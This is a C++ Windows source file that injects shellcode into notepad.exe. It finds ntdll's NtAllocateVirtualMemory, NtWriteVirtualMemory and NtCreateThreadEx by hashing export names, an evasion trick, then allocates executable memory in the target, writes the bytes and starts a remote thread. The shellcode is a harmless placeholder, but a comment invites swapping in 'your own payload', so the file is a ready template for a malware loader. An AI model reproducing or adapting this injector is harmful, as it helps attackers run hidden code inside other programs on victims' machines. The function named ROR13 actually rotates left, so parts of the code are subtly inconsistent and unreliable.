#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

#define HASH_NtAllocateVirtualMemory 0x5ec0e5d0
#define HASH_NtWriteVirtualMemory 0x4a0eab7f
#define HASH_NtCreateThreadEx 0x6f162ef6

typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, ULONG_PTR, PVOID, PVOID);

DWORD ROR13(DWORD dwHash, BYTE ch)
{
    return _rotl(dwHash, 13) ^ ch;
}

DWORD HashAPIName(const char* apiName)
{
    DWORD dwHash = 0;

    while (*apiName)
    {
        dwHash = ROR13(dwHash, *apiName);
        apiName++;
    }

    return dwHash;
}

FARPROC GetFunctionFromExportTable(HMODULE hModule, DWORD dwHash)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDosHeader->e_lfanew);

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return NULL;
    }

    PIMAGE_DATA_DIRECTORY pDataDirectory = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + pDataDirectory->VirtualAddress);

    PDWORD pdwNamesRVA = (PDWORD)((PBYTE)hModule + pExportDirectory->AddressOfNames);
    PDWORD pdwFunctionsRVA = (PDWORD)((PBYTE)hModule + pExportDirectory->AddressOfFunctions);
    PWORD pwOrdinals = (PWORD)((PBYTE)hModule + pExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        const char* pFuncName = (const char*)((PBYTE)hModule + pdwNamesRVA[i]);
        DWORD dwFuncNameHash = HashAPIName(pFuncName);

        if (dwFuncNameHash == dwHash)
        {
            DWORD dwFuncRVA = pdwFunctionsRVA[pwOrdinals[i]];
            FARPROC pFunc = (FARPROC)((PBYTE)hModule + dwFuncRVA);
            return pFunc;
        }
    }

    return NULL;
}

DWORD GetProcessIdByName(const char* processName)
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return 0;
    }

    do
    {
        if (strcmp(pe32.szExeFile, processName) == 0)
        {
            CloseHandle(hProcessSnap);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}

int main()
{
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (!hNtDll)
    {
        std::cout << "Failed to get ntdll.dll handle" << std::endl;
        return 1;
    }

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetFunctionFromExportTable(hNtDll, HASH_NtAllocateVirtualMemory);
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetFunctionFromExportTable(hNtDll, HASH_NtWriteVirtualMemory);
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetFunctionFromExportTable(hNtDll, HASH_NtCreateThreadEx);

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx)
    {
        std::cout << "Failed to get API function addresses" << std::endl;
        return 1;
    }

    std::cout << "NtAllocateVirtualMemory: " << NtAllocateVirtualMemory << std::endl;
    std::cout << "NtWriteVirtualMemory: " << NtWriteVirtualMemory << std::endl;
    std::cout << "NtCreateThreadEx: " << NtCreateThreadEx << std::endl;

    const char* targetProcess = "notepad.exe";
    DWORD targetProcessId = GetProcessIdByName(targetProcess);

    if (!targetProcessId)
    {
        std::cout << "Failed to get the process ID of " << targetProcess << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);

    if (!hProcess)
    {
        std::cout << "Failed to open the target process" << std::endl;
        return 1;
    }

    // Replace this shellcode with your own payload
    unsigned char shellcode[] = { 0x90, 0x90, 0xC3 };

    SIZE_T shellcodeSize = sizeof(shellcode);
    PVOID remoteShellcodeAddress = NULL;
    ULONG allocSize = shellcodeSize;
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteShellcodeAddress, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (status != STATUS_SUCCESS)
    {
        std::cout << "Failed to allocate memory in the target process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    status = NtWriteVirtualMemory(hProcess, remoteShellcodeAddress, shellcode, shellcodeSize, NULL);

    if (status != STATUS_SUCCESS)
    {
        std::cout << "Failed to write shellcode to the target process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hRemoteThread = NULL;
    status = NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteShellcodeAddress, NULL, FALSE, 0, 0, 0, NULL);

    if (status != STATUS_SUCCESS)
    {
        std::cout << "Failed to create remote thread in the target process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Remote thread created successfully" << std::endl;

    WaitForSingleObject(hRemoteThread, INFINITE);

    // Indicate whether the injection succeeded or failed
    DWORD exitCode = 0;
    GetExitCodeThread(hRemoteThread, &exitCode);
    std::cout << "Indicate: " << exitCode << std::endl;

    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);

    return 0;
}
